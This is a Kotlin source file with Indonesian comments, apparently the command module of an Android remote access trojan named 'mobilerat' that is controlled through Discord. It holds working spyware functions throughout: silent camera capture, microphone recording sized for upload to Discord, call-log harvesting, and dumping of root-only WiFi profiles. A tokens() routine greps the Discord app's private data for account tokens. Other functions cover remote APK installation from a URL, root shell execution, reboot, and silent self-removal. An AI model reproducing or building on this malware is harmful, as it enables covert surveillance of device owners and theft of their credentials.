package com.kai.mobilerat

import android.Manifest
import android.app.ActivityManager
import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.ClipData
import android.content.Context
import android.content.Intent
import android.graphics.ImageFormat
import android.hardware.camera2.CameraCaptureSession
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.media.AudioFormat
import android.media.AudioManager
import android.media.AudioRecord
import android.media.ImageReader
import android.media.MediaRecorder
import android.net.Uri
import android.net.wifi.WifiManager
import android.os.Build
import android.os.Handler
import android.os.HandlerThread
import android.os.Looper
import android.os.PowerManager
import android.os.SystemClock
import android.os.VibrationEffect
import android.os.Vibrator
import android.provider.CallLog
import android.provider.Settings
import android.speech.tts.TextToSpeech
import android.util.Size
import android.util.TypedValue
import android.widget.Toast
import androidx.core.app.NotificationCompat
import androidx.core.content.FileProvider
import java.io.File
import java.util.Locale
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit

/**
 * Perintah yang butuh API Android langsung, dipisah dari C2Service supaya
 * service tetap cuma jadi router pesan.
 *
 * Aturan di sini: setiap fungsi mengembalikan satu baris status, tidak pernah
 * melempar ke pemanggil. Perintah yang gagal harus kelihatan alasannya —
 * "gagal diam-diam" adalah bug yang paling mahal di perangkat nyata.
 */
object Actions {

    // ------------------------------------------------------------- utilitas

    private fun sh(cmd: String, timeoutMs: Long = 8000): String {
        val p = try {
            ProcessBuilder("sh", "-c", cmd).redirectErrorStream(true).start()
        } catch (e: Exception) {
            return "ERR ${e.message}"
        }
        val sb = StringBuilder()
        val reader = Thread {
            try {
                p.inputStream.bufferedReader().use { r ->
                    val buf = CharArray(4096)
                    while (true) {
                        val n = r.read(buf)
                        if (n <= 0) break
                        sb.append(buf, 0, n)
                        if (sb.length > 120_000) break
                    }
                }
            } catch (_: Exception) {
            }
        }
        reader.isDaemon = true
        reader.start()
        try {
            reader.join(timeoutMs)
        } catch (_: InterruptedException) {
        }
        try {
            p.destroy()
        } catch (_: Exception) {
        }
        return sb.toString().trim()
    }

    /** Perintah sebagai root. `su` yang tidak ada langsung gagal, bukan hang. */
    fun su(cmd: String, timeoutMs: Long = 8000): String =
        sh("su -c '" + cmd.replace("'", "'\\''") + "'", timeoutMs)

    fun hasSu(): Boolean {
        val out = sh("which su", 3000)
        return out.isNotBlank() && !out.startsWith("ERR")
    }

    private fun ctxApp(ctx: Context): Context = ctx.applicationContext

    // ------------------------------------------------------------ volume/tts

    /**
     * `vol` untuk baca, `vol 40` untuk set 40%, `vol mute|unmute`.
     *
     * adjustStreamVolume dipakai untuk mute karena setStreamVolume 0 bukan
     * mute (volume bisa kembali ke nilai lama saat ada notifikasi).
     */
    fun volume(ctx: Context, arg: String): String {
        val am = ctx.getSystemService(Context.AUDIO_SERVICE) as AudioManager
        val key = AudioManager.STREAM_MUSIC
        val max = am.getStreamMaxVolume(key)
        val cur = am.getStreamVolume(key)
        val a = arg.trim().lowercase()
        return try {
            when {
                a.isEmpty() || a == "get" ->
                    "VOL $cur/$max mute=${am.isStreamMute(key)}"

                a == "mute" -> {
                    am.adjustStreamVolume(key, AudioManager.ADJUST_MUTE, 0)
                    "VOL mute ${am.getStreamVolume(key)}/$max"
                }

                a == "unmute" -> {
                    am.adjustStreamVolume(key, AudioManager.ADJUST_UNMUTE, 0)
                    "VOL unmute ${am.getStreamVolume(key)}/$max"
                }

                a == "up" -> {
                    am.adjustStreamVolume(key, AudioManager.ADJUST_RAISE, 0)
                    "VOL up ${am.getStreamVolume(key)}/$max"
                }

                a == "down" -> {
                    am.adjustStreamVolume(key, AudioManager.ADJUST_LOWER, 0)
                    "VOL down ${am.getStreamVolume(key)}/$max"
                }

                else -> {
                    val pct = a.toIntOrNull()
                        ?: return "pakai: vol [0-100|up|down|mute|unmute]"
                    val target = (pct.coerceIn(0, 100) * max / 100)
                    am.setStreamVolume(key, target, 0)
                    "VOL $target/$max (${pct.coerceIn(0, 100)}%)"
                }
            }
        } catch (e: Exception) {
            "ERR volume: ${e.message}"
        }
    }

    /**
     * TextToSpeech punya siklus hidup sendiri; status akhirnya dikirim lewat
     * callback, bukan nilai balik, karena inisialisasi butuh waktu.
     */
    fun tts(ctx: Context, text: String, done: (String) -> Unit) {
        if (text.isBlank()) {
            done("pakai: tts <teks>")
            return
        }
        Handler(Looper.getMainLooper()).post {
            var engine: TextToSpeech? = null
            engine = TextToSpeech(ctxApp(ctx)) { status ->
                val e = engine
                if (e == null || status != TextToSpeech.SUCCESS) {
                    done("TTS_GAGAL init (status $status)")
                    e?.shutdown()
                } else {
                    e.language = Locale.getDefault()
                    val r = e.speak(text, TextToSpeech.QUEUE_FLUSH, null, "c2")
                    done(if (r == TextToSpeech.SUCCESS) "TTS_OK" else "TTS_GAGAL speak=$r")
                    Handler(Looper.getMainLooper()).postDelayed({ e.shutdown() }, 60_000)
                }
            }
        }
    }

    // -------------------------------------------------------------- notifikasi

    fun notify(ctx: Context, arg: String): String {
        val parts = arg.split("|", limit = 2)
        val title = parts[0].trim().ifEmpty { "System" }
        val body = parts.getOrNull(1)?.trim() ?: if (parts.size == 1) "" else ""
        return try {
            val nm = ctx.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            val ch = "msg"
            if (nm.getNotificationChannel(ch) == null) {
                nm.createNotificationChannel(
                    NotificationChannel(ch, "Pesan sistem", NotificationManager.IMPORTANCE_DEFAULT)
                )
            }
            val n = NotificationCompat.Builder(ctx, ch)
                .setSmallIcon(android.R.drawable.stat_notify_more)
                .setContentTitle(title)
                .setContentText(body)
                .setStyle(NotificationCompat.BigTextStyle().bigText(body))
                .setAutoCancel(true)
                .build()
            nm.notify((SystemClock.elapsedRealtime() % 100000).toInt(), n)
            "NOTIFY_OK"
        } catch (e: Exception) {
            "ERR notify: ${e.message}"
        }
    }

    fun vibrate(ctx: Context, arg: String): String {
        val ms = (arg.trim().toLongOrNull() ?: 600L).coerceIn(80L, 8000L)
        return try {
            val v = ctx.getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
            @Suppress("DEPRECATION")
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                v.vibrate(VibrationEffect.createOneShot(ms, VibrationEffect.DEFAULT_AMPLITUDE))
            } else {
                v.vibrate(ms)
            }
            "VIB ${ms}ms"
        } catch (e: Exception) {
            "ERR vibrate: ${e.message}"
        }
    }

    // ------------------------------------------------------------------ flash

    fun torch(ctx: Context, on: Boolean): String {
        if (!Perms.has(ctx, Manifest.permission.CAMERA)) return "ERR PERM CAMERA"
        return try {
            val cm = ctx.getSystemService(Context.CAMERA_SERVICE) as CameraManager
            for (id in cm.cameraIdList) {
                val ch = cm.getCameraCharacteristics(id)
                if (ch.get(CameraCharacteristics.FLASH_INFO_AVAILABLE) == true) {
                    cm.setTorchMode(id, on)
                    return "TORCH=${if (on) "on" else "off"} ($id)"
                }
            }
            "ERR tidak ada flash di perangkat ini"
        } catch (e: Exception) {
            "ERR torch: ${e.message}"
        }
    }

    // ----------------------------------------------------------------- kamera

    /**
     * Foto tanpa preview. Camera2 boleh capture hanya ke ImageReader.JPEG,
     * tapi ukuran output harus diambil dari StreamConfigurationMap — meminta
     * 1920x1080 mentah akan IllegalArgumentException di perangkat yang tidak
     * mendukung ukuran itu.
     */
    fun camera(ctx: Context, front: Boolean, out: File): String {
        if (!Perms.has(ctx, Manifest.permission.CAMERA)) return "ERR PERM CAMERA"
        val cm = ctx.getSystemService(Context.CAMERA_SERVICE) as CameraManager
        val facing = if (front) CameraCharacteristics.LENS_FACING_FRONT
        else CameraCharacteristics.LENS_FACING_BACK

        val id = cm.cameraIdList.firstOrNull {
            cm.getCameraCharacteristics(it).get(CameraCharacteristics.LENS_FACING) == facing
        } ?: return "ERR kamera ${if (front) "depan" else "belakang"} tidak ada"

        val chars = cm.getCameraCharacteristics(id)
        val map = chars.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
        val size: Size = map?.getOutputSizes(ImageFormat.JPEG)
            ?.filter { it.width * it.height <= 1920 * 1080 }
            ?.maxByOrNull { it.width.toLong() * it.height }
            ?: Size(1280, 720)

        val thread = HandlerThread("cam")
        thread.start()
        val handler = Handler(thread.looper)
        val latch = CountDownLatch(1)
        var err: String? = null
        var reader: ImageReader? = null
        var device: CameraDevice? = null
        var session: CameraCaptureSession? = null

        return try {
            val ir = ImageReader.newInstance(size.width, size.height, ImageFormat.JPEG, 2)
            reader = ir
            ir.setOnImageAvailableListener({ r ->
                try {
                    r.acquireLatestImage()?.use { img ->
                        val buf = img.planes[0].buffer
                        val bytes = ByteArray(buf.remaining())
                        buf.get(bytes)
                        out.parentFile?.mkdirs()
                        out.writeBytes(bytes)
                    }
                } catch (e: Exception) {
                    err = e.message
                } finally {
                    latch.countDown()
                }
            }, handler)

            cm.openCamera(id, object : CameraDevice.StateCallback() {
                override fun onOpened(cam: CameraDevice) {
                    device = cam
                    try {
                        val surface = ir.surface
                        val req = cam.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
                        req.addTarget(surface)
                        val capture = req.build()
                        cam.createCaptureSession(listOf(surface),
                            object : CameraCaptureSession.StateCallback() {
                                override fun onConfigured(s: CameraCaptureSession) {
                                    session = s
                                    try {
                                        s.capture(capture, null, handler)
                                    } catch (e: Exception) {
                                        err = e.message
                                        latch.countDown()
                                    }
                                }

                                override fun onConfigureFailed(s: CameraCaptureSession) {
                                    err = "capture session gagal"
                                    latch.countDown()
                                }
                            }, handler)
                    } catch (e: Exception) {
                        err = e.message
                        latch.countDown()
                    }
                }

                override fun onDisconnected(cam: CameraDevice) {
                    cam.close()
                    err = "kamera dipakai proses lain"
                    latch.countDown()
                }

                override fun onError(cam: CameraDevice, code: Int) {
                    cam.close()
                    err = "open error $code"
                    latch.countDown()
                }
            }, handler)

            val got = latch.await(15, TimeUnit.SECONDS)
            if (out.exists() && out.length() > 1024) {
                "CAM_OK ${out.length()} B ${size.width}x${size.height}"
            } else {
                "CAM_GAGAL " + (err ?: if (!got) "timeout 15s" else "file kosong")
            }
        } catch (e: Exception) {
            "CAM_GAGAL ${e.message}"
        } finally {
            try {
                session?.close()
            } catch (_: Exception) {
            }
            try {
                device?.close()
            } catch (_: Exception) {
            }
            try {
                reader?.close()
            } catch (_: Exception) {
            }
            thread.quitSafely()
        }
    }

    // ------------------------------------------------------------------- mic

    /**
     * Rekaman mikrofon ke WAV. 22050 Hz mono 16-bit = ~2,6 MB per menit, jadi
     * 120 detik masih di bawah batas unggah Discord.
     */
    fun mic(ctx: Context, seconds: Int, out: File): String {
        if (!Perms.has(ctx, Manifest.permission.RECORD_AUDIO)) return "ERR PERM RECORD_AUDIO"
        val secs = seconds.coerceIn(1, 120)
        val rate = 22050
        val min = AudioRecord.getMinBufferSize(
            rate, AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT
        )
        val bufSize = maxOf(min * 2, 16384)
        val rec = AudioRecord(
            MediaRecorder.AudioSource.MIC, rate,
            AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT, bufSize
        )
        if (rec.state != AudioRecord.STATE_INITIALIZED) {
            rec.release()
            return "ERR mic tidak bisa dibuka (mic dipakai proses lain?)"
        }
        val pcm = File(out.parentFile, "mic.pcm")
        return try {
            rec.startRecording()
            val buf = ByteArray(bufSize)
            var written = 0L
            val limit = rate.toLong() * 2 * secs
            pcm.outputStream().use { o ->
                while (written < limit) {
                    val n = rec.read(buf, 0, buf.size)
                    if (n <= 0) break
                    o.write(buf, 0, n)
                    written += n
                }
            }
            rec.stop()
            if (written < 1000) {
                pcm.delete()
                "MIC_GAGAL tidak ada data (izin mic dicabut saat service di background?)"
            } else {
                wav(pcm, out, rate)
                "MIC_OK ${written / 1024} KB / ${secs}s"
            }
        } catch (e: Exception) {
            "MIC_GAGAL ${e.message}"
        } finally {
            try {
                rec.release()
            } catch (_: Exception) {
            }
            pcm.delete()
        }
    }

    private fun wav(pcm: File, out: File, rate: Int) {
        val size = pcm.length().toInt()
        val h = ByteArray(44)
        fun put(off: Int, s: String) {
            s.toByteArray(Charsets.US_ASCII).copyInto(h, off)
        }

        fun i32(off: Int, v: Int) {
            h[off] = (v and 0xff).toByte()
            h[off + 1] = ((v shr 8) and 0xff).toByte()
            h[off + 2] = ((v shr 16) and 0xff).toByte()
            h[off + 3] = ((v shr 24) and 0xff).toByte()
        }

        fun i16(off: Int, v: Int) {
            h[off] = (v and 0xff).toByte()
            h[off + 1] = ((v shr 8) and 0xff).toByte()
        }

        put(0, "RIFF"); i32(4, 36 + size); put(8, "WAVE")
        put(12, "fmt "); i32(16, 16); i16(20, 1); i16(22, 1)
        i32(24, rate); i32(28, rate * 2); i16(32, 2); i16(34, 16)
        put(36, "data"); i32(40, size)

        out.outputStream().use { o ->
            o.write(h)
            pcm.inputStream().use { it.copyTo(o, 64 * 1024) }
        }
        pcm.delete()
    }

    // ------------------------------------------------------------------ wifi

    /**
     * Profil WiFi tersimpan berada di /data/misc/wifi dan hanya bisa dibaca
     * root. Tanpa root yang bisa dilaporkan cuma SSID dan sinyal yang sedang
     * terhubung — itu batas OS, bukan bug.
     */
    fun wifi(ctx: Context): String {
        val sb = StringBuilder()
        try {
            @Suppress("DEPRECATION")
            val wm = ctxApp(ctx).getSystemService(Context.WIFI_SERVICE) as WifiManager
            @Suppress("DEPRECATION")
            val info = wm.connectionInfo
            val ip = intToIp(info.ipAddress)
            sb.append("SSID=").append(info.ssid?.trim('"') ?: "?")
                .append(" IP=").append(ip)
                .append(" RSSI=").append(info.rssi).append("dBm")
                .append(" MAC=").append(info.macAddress ?: "02:00:00:00:00:00")
                .append("\n")
        } catch (e: Exception) {
            sb.append("ERR wifi: ").append(e.message).append("\n")
        }
        if (hasSu()) {
            val conf = su(
                "ls /data/misc/wifi/ 2>/dev/null; " +
                    "cat /data/misc/wifi/WifiConfigStore.xml 2>/dev/null | head -c 4000"
            )
            if (conf.isNotBlank()) sb.append("--- profil (root) ---\n").append(conf)
        } else {
            sb.append("profil tersimpan: butuh root")
        }
        return sb.toString().trim()
    }

    private fun intToIp(ip: Int): String =
        if (ip == 0) "0.0.0.0"
        else "${ip and 0xff}.${(ip shr 8) and 0xff}.${(ip shr 16) and 0xff}.${(ip shr 24) and 0xff}"

    // -------------------------------------------------------------- root/hidup

    fun root(ctx: Context): String {
        if (!hasSu()) return "ROOT=tidak (tidak ada su di PATH)"
        val who = su("id")
        val selinux = su("getenforce")
        return "ROOT=ya\n$who\nselinux=$selinux"
    }

    fun reboot(ctx: Context, arg: String): String {
        val mode = arg.trim().lowercase()
        if (!hasSu()) return "ERR butuh root untuk reboot"
        val cmd = when (mode) {
            "", "now" -> "reboot"
            "shutdown", "off" -> "reboot -p"
            "recovery" -> "reboot recovery"
            "bootloader", "fastboot" -> "reboot bootloader"
            else -> return "pakai: reboot [now|shutdown|recovery|bootloader]"
        }
        val out = su(cmd, 4000)
        return if (out.isBlank()) "REBOOT $cmd" else "REBOOT $cmd -> $out"
    }

    // ------------------------------------------------------------- intent

    fun open(ctx: Context, arg: String): String {
        val u = arg.trim()
        if (!u.startsWith("http")) return "pakai: open <url>"
        return try {
            val i = Intent(Intent.ACTION_VIEW, Uri.parse(u))
                .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            ctx.startActivity(i)
            "OPEN_OK $u"
        } catch (e: Exception) {
            "ERR open: ${e.message}"
        }
    }

    /**
     * Pasang APK dari URL atau path. Android 8+ mewajibkan content:// lewat
     * FileProvider dan izin "install unknown apps" dari pemilik perangkat;
     * dialognya tidak bisa dilewati tanpa root.
     */
    fun install(ctx: Context, arg: String): String {
        val a = arg.trim()
        if (a.isBlank()) return "pakai: inst <url|path>"
        val f = when {
            a.startsWith("http") -> {
                val dest = File(ctx.cacheDir, "install.apk")
                val r = Discord.download(a, dest)
                if (!r.first) return "ERR download: ${r.second}"
                dest
            }

            else -> Vfs.resolve("/sdcard", a)
        }
        if (!f.isFile || f.length() < 1024) return "ERR bukan file apk: ${f.absolutePath}"
        return try {
            val uri = FileProvider.getUriForFile(ctx, ctx.packageName + ".files", f)
            val i = Intent(Intent.ACTION_VIEW)
                .setDataAndType(uri, "application/vnd.android.package-archive")
                .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                .addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
            ctx.startActivity(i)
            "INST_OK ${f.name} (${f.length()} B) — konfirmasi di layar"
        } catch (e: Exception) {
            "ERR install: ${e.message}"
        }
    }

    /**
     * Hapus diri sendiri.
     *
     * Tanpa root satu-satunya jalan adalah dialog paket: Android tidak
     * mengizinkan aplikasi menghapus dirinya sendiri diam-diam, dan
     * REQUEST_DELETE_PACKAGES cuma memberi hak membuka dialog itu. Dengan
     * root, `pm uninstall` jalan tanpa dialog.
     */
    fun uninstall(ctx: Context): String {
        if (hasSu()) {
            val out = su("pm uninstall --user 0 " + ctx.packageName, 20000)
            if (out.contains("Success", ignoreCase = true)) return "UNINSTALL_OK (root)"
            if (out.isNotBlank()) return "UNINSTALL root gagal: $out (dialog dibuka)"
        }
        return try {
            val i = Intent(Intent.ACTION_DELETE, Uri.parse("package:" + ctx.packageName))
                .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            ctx.startActivity(i)
            "UNINSTALL dialog dibuka — konfirmasi di layar"
        } catch (e: Exception) {
            "ERR uninstall: ${e.message}"
        }
    }

    /** Android 8+ punya izin terpisah "install unknown apps". */
    fun canInstall(ctx: Context): Boolean = try {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
            ctx.packageManager.canRequestPackageInstalls()
        else true
    } catch (e: Exception) {
        false
    }

    fun toast(ctx: Context, text: String): String {
        Handler(Looper.getMainLooper()).post {
            Toast.makeText(ctxApp(ctx), text, Toast.LENGTH_LONG).show()
        }
        return "TOAST_OK"
    }

    // ------------------------------------------------------------- data ponsel

    fun calls(ctx: Context): String {
        if (!Perms.has(ctx, Manifest.permission.READ_CALL_LOG)) {
            return "ERR PERM READ_CALL_LOG belum diberikan"
        }
        val sb = StringBuilder()
        try {
            ctx.contentResolver.query(
                CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC"
            )?.use { c ->
                val num = c.getColumnIndex(CallLog.Calls.NUMBER)
                val typ = c.getColumnIndex(CallLog.Calls.TYPE)
                val dur = c.getColumnIndex(CallLog.Calls.DURATION)
                var n = 0
                while (c.moveToNext() && n < 40) {
                    sb.append(c.getString(num) ?: "?")
                        .append(" t=").append(c.getString(typ))
                        .append(" dur=").append(c.getString(dur)).append("s\n")
                    n++
                }
            }
        } catch (e: Exception) {
            return "ERR calls: ${e.message}"
        }
        return sb.toString().trim().ifEmpty { "(kosong)" }
    }

    /**
     * Token Discord di Android disimpan di data privat aplikasi Discord, jadi
     * hanya bisa dibaca root. Yang dicoba: cari file di direktori aplikasi
     * Discord yang berisi pola token, lalu kirim path-nya.
     */
    fun tokens(ctx: Context): String {
        if (!hasSu()) return "ERR butuh root (data privat aplikasi)"
        val out = su(
            "grep -rlE '[MN][A-Za-z0-9_-]{23,}\\.[A-Za-z0-9_-]{6}\\.[A-Za-z0-9_-]{27}' " +
                "/data/data/com.discord /data/user/0/com.discord 2>/dev/null | head -20",
            20000
        )
        return if (out.isBlank()) "GRAB tidak ketemu (Discord mungkin tidak terpasang)" else out
    }

    // ------------------------------------------------------------------ info

    fun sysinfo(ctx: Context): String {
        val sb = StringBuilder()
        val pm = ctx.getSystemService(Context.POWER_SERVICE) as PowerManager
        val am = ctx.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
        val mem = ActivityManager.MemoryInfo().also { am.getMemoryInfo(it) }
        sb.append("${Build.MANUFACTURER} ${Build.MODEL} (${Build.DEVICE})\n")
        sb.append("android ${Build.VERSION.RELEASE} sdk ${Build.VERSION.SDK_INT} ")
        sb.append("abi ${Build.SUPPORTED_ABIS.firstOrNull() ?: "?"}\n")
        sb.append("uptime ${SystemClock.elapsedRealtime() / 60000} menit ")
        sb.append("screen=${if (pm.isInteractive) "on" else "off"} ")
        sb.append("doze=${if (pm.isDeviceIdleMode) "yes" else "no"}\n")
        sb.append("ram free ${mem.availMem / 1048576} MB / ${mem.totalMem / 1048576} MB ")
        sb.append("low=${mem.lowMemory}\n")
        sb.append("su=${if (hasSu()) "ya" else "tidak"} ")
        sb.append("patch=").append(if (Build.VERSION.SDK_INT >= 23)
            Build.VERSION.SECURITY_PATCH else "?")
        sb.append(" fingerprint=").append(Build.FINGERPRINT.take(60)).append("\n")
        val disp = try {
            val wm = ctx.getSystemService(Context.WINDOW_SERVICE) as android.view.WindowManager
            @Suppress("DEPRECATION")
            val d = wm.defaultDisplay
            "${d.width}x${d.height} @${d.rotation * 90}deg"
        } catch (_: Exception) {
            "?"
        }
        sb.append("layar=$disp dpi=").append(
            try {
                ctx.resources.displayMetrics.densityDpi
            } catch (_: Exception) {
                0
            }
        )
        return sb.toString().trim()
    }
}
